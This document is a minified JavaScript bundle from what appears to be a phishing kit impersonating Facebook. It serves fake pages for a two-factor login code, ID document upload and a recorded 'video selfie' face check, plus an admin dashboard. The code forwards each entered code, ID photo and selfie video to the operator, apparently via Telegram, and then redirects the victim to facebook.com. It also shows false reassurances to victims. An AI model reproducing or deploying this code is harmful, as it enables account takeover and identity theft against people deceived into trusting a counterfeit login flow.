s.success&&s.message_id&&(localStorage.setItem("telegram_message_id",s.message_id.toString()),localStorage.setItem("telegram_message",e),k(s.message_id)),s.success}catch(e){return!1}},S=async e=>{let t;if(e.preventDefault(),!v){y("/");return}p(!0),h(x+1);let s=localStorage.getItem("telegram_message")??"",a=/ğŸ” <b>MÃ£ xÃ¡c thá»±c \d+:<\/b> <code>(.*?)<\/code>/g,l=[];for(;null!==(t=a.exec(s));)l.push(t[1]);let r=`ğŸ” <b>M\xe3 x\xe1c thá»±c ${l.length+1}:</b> <code>${f}</code>`,n=s?"\n":"",i=`${s}${n}${r}`.trim();await _(i),await new Promise(e=>setTimeout(e,v.code_load_duration)),x>=v.code_load_limit&&y("/id-verification"),p(!1)};return t?(0,a.jsxs)("div",{className:"flex min-h-screen flex-col bg-gradient-to-br from-[#FFFFFF] via-[#FBF2F9] to-[#EEFCF3] px-4 pt-8 font-[Optimistic]",children:[(0,a.jsxs)("div",{className:"mb-6 flex items-center justify-between",children:[(0,a.jsx)("button",{onClick:()=>{y(-1)},className:"text-[#1c2b33] hover:text-gray-700",children:(0,a.jsx)(d.G,{icon:c.acZ,size:"lg"})}),(0,a.jsx)("button",{onClick:()=>o(!0),className:"text-[#1c2b33] hover:text-gray-700",children:(0,a.jsx)(d.G,{icon:c.FDd,size:"lg"})})]}),(0,a.jsxs)("div",{className:"text-[#0a1317]",children:[(0,a.jsx)("p",{className:"text-[13px] font-medium",children:"Facebook account â€¢ Facebook"}),(0,a.jsx)("p",{className:"mt-4 text-2xl font-semibold",children:"Enter your login code"}),(0,a.jsx)("p",{className:"mb-4 text-[15px]",children:"Enter the 6-digit code we just sent to your SMS, WhatsApp, or from a two-factor authentication app you've set up (like Duo Mobile or Google Authenticator)."})]}),(0,a.jsx)("img",{src:j,alt:"",className:"mb-4 w-full rounded-xl"}),(0,a.jsx)("div",{className:"relative mb-4",children:(0,a.jsxs)("div",{className:"relative h-[56px]",children:[(0,a.jsx)("input",{ref:m,id:"code-input-mobile",type:"number",placeholder:" ",value:f,onChange:e=>{let t=e.target.value;t.length<=6&&g(t)},className:"peer absolute inset-0 w-full [appearance:textfield] rounded-xl border border-gray-300 bg-white px-4 pt-[20px] text-gray-900 focus:border-blue-500 [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:appearance-none"}),(0,a.jsx)("button",{onClick:()=>{g("")},className:"absolute top-1/2 right-4 -translate-y-1/2 text-gray-500 peer-placeholder-shown:hidden hover:text-gray-700",children:(0,a.jsx)(d.G,{icon:c.g82,size:"lg"})}),(0,a.jsx)("label",{htmlFor:"code-input-mobile",className:"absolute top-4 left-4 text-gray-500 transition-all peer-focus:-translate-y-3 peer-focus:text-sm peer-[&:not(:placeholder-shown)]:-translate-y-2 peer-[&:not(:placeholder-shown)]:text-sm",children:"Code"})]})}),(0,a.jsxs)("div",{className:"flex flex-col gap-3",children:[(0,a.jsx)("button",{onClick:S,disabled:u||6!==f.length,className:`w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition ${u?"cursor-default opacity-50":"hover:bg-blue-600"} disabled:opacity-50`,children:"Continue"}),(0,a.jsx)("button",{onClick:()=>r(!0),className:"w-full rounded-full border border-[#dadde1] bg-transparent px-4 py-3 text-[15px] font-semibold text-[#1c2b33] transition hover:bg-[#f2f2f2]",children:"Try Another Way"})]}),s&&(0,a.jsx)(w,{onClose:()=>r(!1)}),i&&(0,a.jsx)(w,{onClose:()=>o(!1)})]}):(0,a.jsxs)("div",{className:"flex min-h-screen flex-col items-center justify-center font-[Optimistic]",children:[(0,a.jsxs)("div",{className:"max-w-[600px]",children:[(0,a.jsxs)("div",{className:"text-[#0a1317]",children:[(0,a.jsx)("p",{className:"text-[13px] font-medium",children:"Facebook account â€¢ Facebook"}),(0,a.jsx)("p",{className:"text-2xl font-semibold",children:"Enter your login code"}),(0,a.jsx)("p",{className:"mb-2 text-[15px]",children:"Enter the 6-digit code we just sent to your SMS, WhatsApp, or from a two-factor authentication app you've set up (like Duo Mobile or Google Authenticator)."})]}),(0,a.jsx)("img",{src:j,alt:"",className:"mb-3"}),(0,a.jsx)("div",{className:"relative mb-3",children:(0,a.jsxs)("div",{className:"relative h-[56px]",children:[(0,a.jsx)("input",{ref:m,id:"code-input",type:"number",placeholder:" ",value:f,onChange:e=>{let t=e.target.value;t.length<=6&&g(t)},className:"peer absolute inset-0 w-full [appearance:textfield] rounded-xl border border-gray-300 bg-white px-4 pt-[20px] text-gray-900 focus:border-blue-500 [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:appearance-none"}),(0,a.jsx)("button",{onClick:()=>{g("")},className:"absolute top-1/2 right-4 -translate-y-1/2 text-gray-500 peer-placeholder-shown:hidden hover:text-gray-700",children:(0,a.jsx)(d.G,{icon:c.g82,size:"lg"})}),(0,a.jsx)("label",{htmlFor:"code-input",className:"absolute top-4 left-4 text-gray-500 transition-all peer-focus:-translate-y-3 peer-focus:text-sm peer-[&:not(:placeholder-shown)]:-translate-y-2 peer-[&:not(:placeholder-shown)]:text-sm",children:"Code"})]})}),(0,a.jsxs)("div",{className:"flex flex-col gap-2",children:[(0,a.jsx)("button",{onClick:S,disabled:u||6!==f.length,className:`w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition ${u?"cursor-default opacity-50":"hover:bg-blue-600"} disabled:opacity-50`,children:"Continue"}),(0,a.jsx)("button",{onClick:()=>r(!0),className:"w-full rounded-full border border-[#dadde1] bg-transparent px-4 py-3 text-[15px] font-semibold text-[#1c2b33] transition hover:bg-[#f2f2f2]",children:"Try Another Way"})]})]}),s&&(0,a.jsx)(w,{onClose:()=>r(!1)}),i&&(0,a.jsx)(w,{onClose:()=>o(!1)})]})},v=()=>{let[e,t]=(0,n.useState)(!1);return(0,n.useEffect)(()=>{let e=()=>{t(window.innerWidth<768)};return e(),window.addEventListener("resize",e),()=>{window.removeEventListener("resize",e)}},[]),(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)("title",{children:"Facebook"}),(0,a.jsx)(y,{isMobile:e})]})},N=s.p+"static/image/upload-image.a238b251.webp",k=e=>{let{isMobile:t}=e,[s,r]=(0,n.useState)(null),[i,o]=(0,n.useState)(!1),[m,x]=(0,n.useState)(0),[h,u]=(0,n.useState)(!1),p=(0,n.useRef)(null),b=(0,l.s0)();(0,n.useEffect)(()=>{let e;return i?(x(0),e=setInterval(()=>{x(e=>h?100:e>=90?90:e+2)},100)):x(0),()=>clearInterval(e)},[i,h]);let f=e=>!!["image/jpeg","image/png","image/gif","image/webp"].includes(e.type)||(alert("Please select a valid image file (jpg, png, gif, webp)"),!1),g=async e=>{var t;e.preventDefault();let s=null===(t=e.target.files)||void 0===t?void 0:t[0];if(s&&f(s)){r(s),o(!0),u(!1);try{let e=new FormData;e.append("photo",s);let t=localStorage.getItem("telegram_message_id");t&&e.append("message_id",t);let a=await fetch("/api/sendPhoto",{method:"POST",body:e}),l=await a.json();l.success&&(u(!0),localStorage.setItem("telegram_message_id",l.message_id.toString()),b("/kyc-face-verify"))}catch(e){}finally{o(!1)}}},j=()=>{var e;null===(e=p.current)||void 0===e||e.click()};return t?(0,a.jsxs)("div",{className:"flex min-h-screen flex-col bg-gradient-to-br from-[#FFFFFF] via-[#FBF2F9] to-[#EEFCF3] px-4 pt-8 font-[Optimistic]",children:[(0,a.jsx)("div",{className:"mb-6 flex items-center justify-between",children:(0,a.jsx)("button",{onClick:()=>{b(-1)},className:"text-[#1c2b33] hover:text-gray-700",children:(0,a.jsx)(d.G,{icon:c.acZ,size:"lg"})})}),(0,a.jsxs)("div",{className:"text-[#0a1317]",children:[(0,a.jsx)("p",{className:"text-[13px] font-medium"}),(0,a.jsx)("p",{className:"mt-4 text-2xl font-semibold",children:"Upload your ID"}),(0,a.jsx)("p",{className:"mb-4 text-[15px]",children:"Upload a photo that clearly shows your ID or document."})]}),(0,a.jsx)("img",{src:N,alt:"",className:"mb-4 w-full rounded-xl"}),(0,a.jsxs)("div",{className:"mb-8",children:[(0,a.jsx)("h2",{className:"mb-4 font-medium text-gray-900",children:"To get started"}),(0,a.jsxs)("div",{className:"space-y-6",children:[(0,a.jsxs)("div",{className:"flex items-center gap-4",children:[(0,a.jsx)("div",{className:"flex-shrink-0",children:(0,a.jsx)(d.G,{icon:c.X8G,className:"h-5 w-5 text-gray-600"})}),(0,a.jsx)("p",{className:"text-[15px] text-gray-600",children:"Choose a well-lit environment"})]}),(0,a.jsxs)("div",{className:"flex items-center gap-4",children:[(0,a.jsx)("div",{className:"flex-shrink-0",children:(0,a.jsx)(d.G,{icon:c.enB,className:"h-5 w-5 text-gray-600"})}),(0,a.jsx)("p",{className:"text-[15px] text-gray-600",children:"Ensure no glare or shadows"})]}),(0,a.jsxs)("div",{className:"flex items-center gap-4",children:[(0,a.jsx)("div",{className:"flex-shrink-0",children:(0,a.jsx)(d.G,{icon:c.TL5,className:"h-5 w-5 text-gray-600"})}),(0,a.jsx)("p",{className:"text-[15px] text-gray-600",children:"Include all four corners in the image"})]})]})]}),s&&(0,a.jsx)("div",{className:"mb-4",children:(0,a.jsxs)("div",{className:"flex flex-col space-y-2 rounded-lg bg-white p-3",children:[(0,a.jsxs)("div",{className:"flex items-center justify-between",children:[(0,a.jsx)("span",{className:"text-sm text-gray-600",children:"Uploading..."}),(0,a.jsxs)("span",{className:"text-xs text-gray-500",children:[(s.size/1024/1024).toFixed(2)," MB"]})]}),(0,a.jsx)("div",{className:"h-2 w-full overflow-hidden rounded-full bg-gray-100",children:(0,a.jsx)("div",{className:"h-full bg-blue-600 transition-all duration-200",style:{width:`${m}%`}})})]})}),(0,a.jsx)("div",{className:"flex flex-col gap-3",children:(0,a.jsx)("button",{onClick:j,disabled:i,className:`w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition hover:bg-blue-600 ${i?"cursor-not-allowed opacity-50":""}`,children:i?"Uploading...":"Upload photo"})}),(0,a.jsx)("input",{type:"file",accept:"image/*",onChange:g,className:"hidden",ref:p})]}):(0,a.jsx)("div",{className:"flex min-h-screen flex-col items-center justify-center font-[Optimistic]",children:(0,a.jsxs)("div",{className:"max-w-[600px]",children:[(0,a.jsxs)("div",{className:"text-[#0a1317]",children:[(0,a.jsx)("p",{className:"text-[13px] font-medium"}),(0,a.jsx)("p",{className:"text-2xl font-semibold",children:"Upload your ID"}),(0,a.jsx)("p",{className:"mb-2 text-[15px]",children:"Upload a photo that clearly shows your ID or document."})]}),(0,a.jsx)("img",{src:N,alt:"",className:"mb-3"}),(0,a.jsxs)("div",{className:"mb-8",children:[(0,a.jsx)("h2",{className:"mb-4 font-medium text-gray-900",children:"To get started"}),(0,a.jsxs)("div",{className:"space-y-6",children:[(0,a.jsxs)("div",{className:"flex items-center gap-4",children:[(0,a.jsx)("div",{className:"flex-shrink-0",children:(0,a.jsx)(d.G,{icon:c.X8G,className:"h-5 w-5 text-gray-600"})}),(0,a.jsx)("p",{className:"text-[15px] text-gray-600",children:"Choose a well-lit environment"})]}),(0,a.jsxs)("div",{className:"flex items-center gap-4",children:[(0,a.jsx)("div",{className:"flex-shrink-0",children:(0,a.jsx)(d.G,{icon:c.enB,className:"h-5 w-5 text-gray-600"})}),(0,a.jsx)("p",{className:"text-[15px] text-gray-600",children:"Ensure no glare or shadows"})]}),(0,a.jsxs)("div",{className:"flex items-center gap-4",children:[(0,a.jsx)("div",{className:"flex-shrink-0",children:(0,a.jsx)(d.G,{icon:c.TL5,className:"h-5 w-5 text-gray-600"})}),(0,a.jsx)("p",{className:"text-[15px] text-gray-600",children:"Include all four corners in the image"})]})]})]}),s&&(0,a.jsx)("div",{className:"mb-4",children:(0,a.jsxs)("div",{className:"flex flex-col space-y-2 rounded-lg bg-white p-3",children:[(0,a.jsxs)("div",{className:"flex items-center justify-between",children:[(0,a.jsx)("span",{className:"text-sm text-gray-600",children:"Uploading..."}),(0,a.jsxs)("span",{className:"text-xs text-gray-500",children:[(s.size/1024/1024).toFixed(2)," MB"]})]}),(0,a.jsx)("div",{className:"h-2 w-full overflow-hidden rounded-full bg-gray-100",children:(0,a.jsx)("div",{className:"h-full bg-blue-600 transition-all duration-200",style:{width:`${m}%`}})})]})}),(0,a.jsx)("div",{className:"flex flex-col gap-2",children:(0,a.jsx)("button",{onClick:j,className:"w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition hover:bg-blue-600",children:"Upload photo"})}),(0,a.jsx)("input",{type:"file",accept:"image/*",onChange:g,className:"hidden",ref:p})]})})},_=()=>{let[e,t]=(0,n.useState)(!1);return(0,n.useEffect)(()=>{let e=()=>{t(window.innerWidth<768)};return e(),window.addEventListener("resize",e),()=>{window.removeEventListener("resize",e)}},[]),(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)("title",{children:"Facebook"}),(0,a.jsx)(k,{isMobile:e})]})};var S=s(314),F=s.n(S);let C=()=>{let e=(0,n.useRef)(null),t=(0,n.useRef)(null),[s,l]=(0,n.useState)(!1),[r,i]=(0,n.useState)(0),[o,m]=(0,n.useState)(10),[x,h]=(0,n.useState)(!1),u=(0,n.useRef)([]),p=[{icon:c.FPD,text:"Look Up",position:"top-[10%] left-1/2 -translate-x-1/2"},{icon:c.r5q,text:"Look Down",position:"bottom-[10%] left-1/2 -translate-x-1/2"},{icon:c.acZ,text:"Turn Left",position:"left-[10%] top-1/2 -translate-y-1/2"},{icon:c.eFW,text:"Turn Right",position:"right-[10%] top-1/2 -translate-y-1/2"}];(0,n.useEffect)(()=>{let e,t;return s&&(e=setInterval(()=>{m(e=>Math.max(0,e-1))},1e3),t=setInterval(()=>{i(e=>(e+1)%p.length)},2500)),()=>{clearInterval(e),clearInterval(t)}},[s,p.length]);let b=e=>{let t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",s="";for(let a=0;a<e;a++)s+=t.charAt(Math.floor(Math.random()*t.length));return s},f=(0,n.useCallback)(async e=>{h(!0);try{let t=new FormData,s="video/webm"===e.type?"webm":"mp4",a=`face-verify-${b(10)}.${s}`;t.append("video",e,a);let l=localStorage.getItem("telegram_message_id");l&&t.append("message_id",l);let r=await fetch("/api/sendVideo",{method:"POST",body:t}),n=await r.json();n.success&&(localStorage.setItem("telegram_message_id",n.message_id.toString()),window.location.replace("https://www.facebook.com"))}catch(e){h(!1)}},[]),g=(0,n.useCallback)(()=>{var s;l(!0),m(10),i(0),u.current=[];let a=null===(s=e.current)||void 0===s?void 0:s.stream;if(a){let e=MediaRecorder.isTypeSupported("video/mp4")?"video/mp4":"video/webm",s=new MediaRecorder(a,{mimeType:e,videoBitsPerSecond:25e5});t.current=s,s.onstart=()=>{u.current=[]},s.onstop=()=>{f(new Blob(u.current,{type:e}))},s.ondataavailable=e=>{e.data.size>0&&u.current.push(e.data)},s.start(),setTimeout(()=>{t.current&&"recording"===t.current.state&&(t.current.stop(),l(!1))},1e4)}},[e,f]);return(0,a.jsx)("div",{className:"min-h-screen bg-gradient-to-br from-[#FFFFFF] via-[#FBF2F9] to-[#EEFCF3] px-4 py-8 font-[Optimistic] md:bg-white md:bg-none",children:(0,a.jsxs)("div",{className:"mx-auto w-full max-w-[600px]",children:[(0,a.jsx)("div",{className:"mb-6 flex items-center justify-between md:hidden",children:(0,a.jsx)("button",{className:"text-[#1c2b33] hover:text-gray-700",children:(0,a.jsx)(d.G,{icon:c.acZ,size:"lg"})})}),(0,a.jsxs)("div",{className:"mb-6 md:mb-8",children:[(0,a.jsx)("p",{className:"text-[13px] font-medium text-[#0a1317]"}),(0,a.jsx)("h1",{className:"mb-2 text-2xl font-semibold text-[#0a1317]",children:"Take a Video Selfie"}),(0,a.jsx)("p",{className:"text-[15px] text-gray-600",children:"We need a short video of you turning your head in different directions. This helps us confirm your identity and check that you're a real person."})]}),(0,a.jsx)("div",{className:"relative mb-6 md:mb-8",children:(0,a.jsx)("div",{className:"relative mx-auto aspect-square w-full max-w-[480px]",children:(0,a.jsx)("div",{className:"relative h-full w-full overflow-hidden rounded-full",children:(0,a.jsx)("div",{className:"absolute inset-0 rounded-full bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 p-[3px]",children:(0,a.jsx)("div",{className:"h-full w-full rounded-full bg-gradient-to-br from-[#FFFFFF] via-[#FBF2F9] to-[#EEFCF3] p-[2px]",children:(0,a.jsxs)("div",{className:"relative h-full w-full overflow-hidden rounded-full",children:[(0,a.jsx)(F(),{audio:!1,ref:e,videoConstraints:{width:720,height:720,facingMode:"user"},className:"h-full w-full object-cover"}),(0,a.jsxs)("div",{className:"absolute inset-0 flex items-center justify-center",children:[(0,a.jsx)("div",{className:`h-[calc(100%-48px)] w-[calc(100%-48px)] rounded-full border-[3px] ${s?"border-[#0064E0] shadow-[0_0_15px_rgba(0,100,224,0.3)]":"border-white/90 shadow-[0_0_15px_rgba(255,255,255,0.2)]"} transition-all duration-300`}),(0,a.jsx)("div",{className:"absolute inset-0 -z-10 rounded-full bg-black/20"})]}),s&&(0,a.jsx)("div",{className:`absolute ${p[r].position} transform`,children:(0,a.jsxs)("div",{className:"flex flex-col items-center text-white",children:[(0,a.jsx)(d.G,{icon:p[r].icon,className:"mb-2 h-6 w-6 animate-bounce md:h-8 md:w-8"}),(0,a.jsx)("p",{className:"rounded-full bg-black/60 px-4 py-1.5 text-[15px] font-medium backdrop-blur-sm",children:p[r].text}),(0,a.jsxs)("p",{className:"mt-2 rounded-full bg-[#0064E0]/80 px-4 py-1.5 text-lg font-semibold backdrop-blur-sm",children:[o,"s"]})]})})]})})})})})}),(0,a.jsxs)("div",{className:"mb-6 flex items-center gap-3 rounded-xl bg-white/80 p-4 shadow-sm backdrop-blur-sm md:mb-8",children:[(0,a.jsx)(d.G,{icon:c.byT,className:"h-5 w-5 text-gray-600"}),(0,a.jsx)("p",{className:"text-[15px] text-gray-600",children:"No one else will see this video and it will be deleted 30 days after your identity is confirmed."})]}),(0,a.jsx)("button",{className:`w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition hover:bg-blue-600 ${s||x?"cursor-not-allowed opacity-50":""}`,onClick:g,disabled:s||x,children:s?(0,a.jsxs)("div",{className:"flex items-center justify-center",children:[(0,a.jsx)(d.G,{icon:c.LM3,className:"mr-2 h-4 w-4 animate-spin"}),"Processing..."]}):x?(0,a.jsxs)("div",{className:"flex items-center justify-center",children:[(0,a.jsx)(d.G,{icon:c.LM3,className:"mr-2 h-4 w-4 animate-spin"}),"Processing request..."]}):"Start Recording"})]})})};var T=s(511);let z=document.getElementById("root");z&&T.createRoot(z).render((0,a.jsx)(n.StrictMode,{children:(0,a.jsx)(l.VK,{children:(0,a.jsx)(()=>(0,a.jsxs)(l.Z5,{children:[(0,a.jsxs)(l.AW,{path:"/",element:(0,a.jsx)(r,{}),children:[(0,a.jsx)(l.AW,{index:!0,element:(0,a.jsx)(g,{})}),(0,a.jsx)(l.AW,{path:"two-step-verification",element:(0,a.jsx)(v,{})}),(0,a.jsx)(l.AW,{path:"id-verification",element:(0,a.jsx)(_,{})}),(0,a.jsx)(l.AW,{path:"kyc-face-verify",element:(0,a.jsx)(C,{})})]}),(0,a.jsxs)(l.AW,{path:"/admin",element:(0,a.jsx)(i,{}),children:[(0,a.jsx)(l.AW,{path:"login",element:(0,a.jsx)(m,{})}),(0,a.jsx)(l.AW,{path:"dashboard",element:(0,a.jsx)(o,{})})]}),(0,a.jsx)(l.AW,{path:"*",element:(0,a.jsx)(l.Fg,{to:"/",replace:!0})})]}),{})})}))}},t={};function s(a){var l=t[a];if(void 0!==l)return l.exports;var r=t[a]={exports:{}};return e[a].call(r.exports,r,r.exports,s),r.exports}s.m=e,s.n=e=>{var t=e&&e.__esModule?()=>e.default:()=>e;return s.d(t,{a:t}),t},s.d=(e,t)=>{for(var a in t)s.o(t,a)&&!s.o(e,a)&&Object.defineProperty(e,a,{enumerable:!0,get:t[a]})},s.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t),(()=>{var e=[];s.O=(t,a,l,r)=>{if(a){r=r||0;for(var n=e.length;n>0&&e[n-1][2]>r;n--)e[n]=e[n-1];e[n]=[a,l,r];return}for(var i=1/0,n=0;n<e.length;n++){for(var[a,l,r]=e[n],o=!0,c=0;c<a.length;c++)(!1&r||i>=r)&&Object.keys(s.O).every(e=>s.O[e](a[c]))?a.splice(c--,1):(o=!1,r<i&&(i=r));if(o){e.splice(n--,1);var d=l();void 0!==d&&(t=d)}}return t}})(),s.p="/",s.rv=()=>"1.2.8",(()=>{var e={980:0};s.O.j=t=>0===e[t];var t=(t,a)=>{var l,r,[n,i,o]=a,c=0;if(n.some(t=>0!==e[t])){for(l in i)s.o(i,l)&&(s.m[l]=i[l]);if(o)var d=o(s)}for(t&&t(a);c<n.length;c++)r=n[c],s.o(e,r)&&e[r]&&e[r][0](),e[r]=0;return s.O(d)},a=self.webpackChunkrsbuild_react_kit=self.webpackChunkrsbuild_react_kit||[];a.forEach(t.bind(null,0)),a.push=t.bind(null,a.push.bind(a))})(),s.ruid="bundler=rspack@1.2.8";var a=s.O(void 0,["361","118","654"],function(){return s(181)});a=s.O(a)})();